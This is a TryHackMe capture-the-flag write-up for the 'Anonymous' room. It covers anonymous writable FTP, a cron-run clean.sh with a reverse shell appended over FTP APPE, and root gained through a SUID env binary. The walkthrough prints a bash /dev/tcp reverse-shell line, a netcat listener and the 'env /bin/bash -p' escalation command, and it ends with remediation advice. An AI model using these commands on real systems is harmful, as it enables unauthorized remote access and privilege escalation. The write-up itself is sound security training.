# Anonymous

**Platform:** TryHackMe
**Category:** Challenge Room
**Difficulty:** Medium
**Status:** ✅ Solved (user flag and root flag captured)

## Background

Anonymous is named after its way in: an FTP server that allows **anonymous login** — and, far worse, anonymous *write* access to a directory containing scripts that the system executes on a schedule. The maintenance script `clean.sh` lives in a world-writable FTP folder, so anyone on the network can change what the server runs as a privileged cleanup job. The room also teaches the classic recovery when a direct overwrite breaks the file: replacing a file over FTP destroys its executable bit, but FTP's **append (APPE)** command adds content to the *existing* file, preserving the original's permissions. Privilege escalation is a second textbook item: the innocuous `env` binary carries the SUID bit, and GTFOBins documents how that turns into a root shell.

## Lab Objective

Get a shell on the target by abusing the anonymous, writable FTP service and its scheduled cleanup script, capture the user flag, then escalate to root through the SUID `env` binary and capture the root flag.

**Provided resources:** the target machine only; no credentials are given.

<img width="2743" height="666" alt="step-1" src="https://github.com/user-attachments/assets/3a1e0935-fcde-4982-bd10-926c1970a1b9" />


<img width="3234" height="1665" alt="step-2" src="https://github.com/user-attachments/assets/f0a68789-3915-40fb-95e4-2b4137232bfb" />


## Walkthrough

### Step 1: Scan the Target

Run an aggressive Nmap scan:

```bash
nmap -A -Pn 10.49.164.187
```

Four ports are open, and the FTP result is the finding of the scan:

| Port | Service | Detail |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 — **anonymous login allowed**, and a writable `scripts` directory is listed |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 139/tcp | NetBIOS-SSN | Samba |
| 445/tcp | SMB | Samba 4.7.6-Ubuntu |

Nmap's `ftp-anon` script even prints the prize directly: a directory named `scripts`, flagged **writeable**, reachable without any password.

<img width="2480" height="1421" alt="step-3" src="https://github.com/user-attachments/assets/fed281ae-8aaf-4a90-a233-c0d7fd7ef84c" />


### Step 2: Check the SMB Share First

Work the services in order. Enumerating SMB turns up a share containing **two picture files**. Download them to Kali and look — they hold no credentials and no usable shortcut; the share is a side path, not the way in. Noting dead ends matters: the real surface is FTP.
<img width="2058" height="795" alt="step-4" src="https://github.com/user-attachments/assets/92a55237-c34c-46e3-99de-23516f3097be" />


<img width="2565" height="728" alt="step-5" src="https://github.com/user-attachments/assets/811b9826-3650-4b23-96ed-1a3793c7196f" />


### Step 3: Log In to FTP Anonymously and Take the Scripts

Connect to FTP with the username `anonymous` (any password, conventionally an email address, is accepted):

```bash
ftp 10.49.164.187
```

Inside is the `scripts` directory, containing three files. Download all three:

```text
cd scripts
mget *
```

<img width="2214" height="1357" alt="step-6" src="https://github.com/user-attachments/assets/3f26fa7e-cf57-4f7d-bf50-9dda3af872ac" />


<img width="2798" height="1435" alt="step-7" src="https://github.com/user-attachments/assets/78a0c4ff-180d-4e79-a990-ea88e28ef8ca" />


### Step 4: Read the Files — `clean.sh` Is the Target

Open the three files. The set is a small maintenance toolkit: a log of removed files, a `to_do` note, and **`clean.sh`** — a shell script that tidies temporary locations on the machine. A script like this, sitting in a writable folder, only matters if something *runs* it — and housekeeping scripts exist precisely because a scheduler (cron) runs them, typically as root. If the content of `clean.sh` can be changed, the next scheduled run executes the attacker's code instead of the cleanup.

<img width="2632" height="1401" alt="step-8" src="https://github.com/user-attachments/assets/aa854ec3-fefd-4c4f-816b-3668382f142c" />


### Step 5: First Attempt — Overwriting the Script Breaks It

The direct approach: edit the local copy of `clean.sh`, replacing its body with a reverse-shell payload line:

```bash
bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
```

<img width="2336" height="400" alt="step-9" src="https://github.com/user-attachments/assets/5eb26a57-4ed3-4951-a19e-ba40e8cdb28c" />


Upload the modified file over the original with `put`. Then the problem appears: the freshly uploaded `clean.sh` is **no longer executable**. An FTP upload creates a new file with default permissions; the original's executable bit does not survive replacement, and the FTP account has no rights to `chmod` it back. A non-executable cleanup script will never run — the cron job would skip or fail it, and no shell will arrive.

<img width="2819" height="1103" alt="step-10" src="https://github.com/user-attachments/assets/08305bb3-a3a5-432c-9622-8efa8c2e29fb" />





### Step 6: The Append Trick — Add the Payload, Keep the Permissions

Reconnect to the server so the **original, executable** `clean.sh` is back in place untouched. Then change strategy:

1. Put the payload in a *separate* small file locally and upload that file.
2. Use FTP's append command, `APPE`, to append the payload file's content **onto the end of the existing `clean.sh`**.

Appending modifies the original file in place — its inode and its permissions, including the executable bit, are preserved — while the payload becomes part of what the script runs. The scheduler sees the same executable script it always ran; it just does one extra thing now.
<img width="2846" height="760" alt="step-11" src="https://github.com/user-attachments/assets/8ce8404f-d9b7-4c51-b0bf-173ae521516d" />





### Step 7: Catch the Shell and Take the User Flag

Set the listener on Kali before the next scheduled run:

```bash
nc -nlvp 4444
```

When the cleanup job fires, the appended line executes and the listener receives the connection — a shell on the target. From it, read the **user flag**.

<img width="2400" height="858" alt="step-12" src="https://github.com/user-attachments/assets/fc982096-da8b-4ed9-b5e7-bd30c04ad950" />



### Step 8: Escalate — Find the SUID Binaries

Enumerate binaries carrying the SUID bit, the standard first privilege-escalation check:

```bash
find / -perm -4000 2>/dev/null
```

<img width="1995" height="394" alt="step-13" src="https://github.com/user-attachments/assets/c8eece85-1224-4a13-8609-6325bf5a80b5" />


Most of the list is the usual system set (`passwd`, `gpasswd`, `chsh`...), but one entry does not belong: **`/usr/bin/env`** is SUID. `env`'s whole job is to run other programs — running it with root's effective privileges means running *any* program as root.

<img width="1805" height="405" alt="step-14" src="https://github.com/user-attachments/assets/517880fb-2340-48a8-85c6-a65b057bb789" />


### Step 9: GTFOBins — the SUID Entry for `env`

Open GTFOBins and filter by the **SUID** capability, then open the `env` page. Its SUID recipe runs a shell through `env` so the shell inherits the elevated privileges. Following the entry, with two adjustments: use the full path of `env`, and ask for `bash` instead of `sh`:

<img width="2521" height="826" alt="step-15" src="https://github.com/user-attachments/assets/5b95f198-538c-4c76-8273-320a2c1d092a" />


<img width="2142" height="629" alt="step-16" src="https://github.com/user-attachments/assets/ca96d0f5-29e3-4490-9a56-4a0f0aa22802" />

<img width="2433" height="1221" alt="step-17" src="https://github.com/user-attachments/assets/04ccc114-7ca3-4429-ae91-07ff75482dd0" />


```bash
/usr/bin/env /bin/bash -p
```

The `-p` flag tells bash not to drop the effective UID it inherited. The prompt that returns is root.
<img width="2133" height="628" alt="step-18" src="https://github.com/user-attachments/assets/85b84328-c650-4ff7-96d5-3072ebedfc1d" />


### Step 10: Read the Root Flag

As root, open the flag in `/root` — room complete.

<img width="1917" height="537" alt="step-19" src="https://github.com/user-attachments/assets/1865c3b5-e195-47f4-ad3d-e9577468dd83" />


## Key Takeaways

- Anonymous FTP is dangerous in proportion to what it can *write*, not what it can read. A writable directory holding scripts that a scheduler executes is unauthenticated remote code execution with a timer.
- FTP uploads replace files and reset their permissions. When an exploit depends on the original file's executable bit, the **APPE append** technique is the fix: modify the file's content without replacing the file.
- Anything executed by cron must live somewhere unprivileged users cannot write. Script directories served by FTP, web or file shares should be read-only to everyone except the owner account.
- SUID enumeration (`find / -perm -4000`) plus GTFOBins is a complete escalation workflow: the unusual entry in the list (`env`, a program-runner by design) converts directly into a root shell with `-p` preserving the effective UID.

## Remediation

Disable anonymous FTP entirely; if a public drop-box is genuinely required, give it write-only access to a quarantine directory that nothing executes from, and never let service or script directories be writable by transfer protocols. Scheduled scripts should be owned by root, stored outside any network-writable path, and run with the least privilege the task needs. Audit SUID binaries and strip the bit from anything that does not strictly require it — a general-purpose tool like `env` should never carry it. Finally, prefer authenticated, encrypted transfer (SFTP) over legacy FTP, which exposes both credentials and content in plain text.
